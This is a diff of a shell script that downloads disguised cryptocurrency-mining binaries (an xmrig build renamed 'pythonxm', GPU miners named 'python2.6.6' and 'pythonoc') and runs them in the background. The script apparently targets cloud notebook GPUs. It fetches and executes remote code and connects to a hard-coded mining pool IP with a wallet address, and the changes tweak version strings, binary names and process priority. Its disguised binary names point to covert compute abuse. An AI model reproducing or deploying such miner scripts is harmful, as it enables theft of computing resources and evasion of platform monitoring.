@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### RV v0.0.3 #######################'
+echo '##################### RV v0.0.4 #######################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -25,16 +25,16 @@ echo > results.txt
 
 ########## XMR
 rm -rf pythonxm
-rm -rf config3.json
+rm -rf config.json
 rm -rf x.out
 
 # Prepare
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
 chmod +x pythonxm
 wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+COLAB_RV_$IPNAME+g" config.json
+sed -i "s+ip0001+RV_$IPNAME+g" config.json
 
-nohup nice --10 ./pythonxm -c config.json 2>> oout 1>> oout &
+nohup  ./pythonxm -c config.json 2>> oout 1>> oout &
 
 
 
@@ -42,18 +42,19 @@ if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
     do
-        nohup nice --10 ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
+        echo "####################### #########################"
+        nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
         tail -f oout
    done
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-    nohup nice --10 ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
+    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
     tail -f oout
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
-    nohup nice --10 ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
     tail -f oout
 else
-    nohup nice --10 ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+    nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
      tail -f oout
 fi
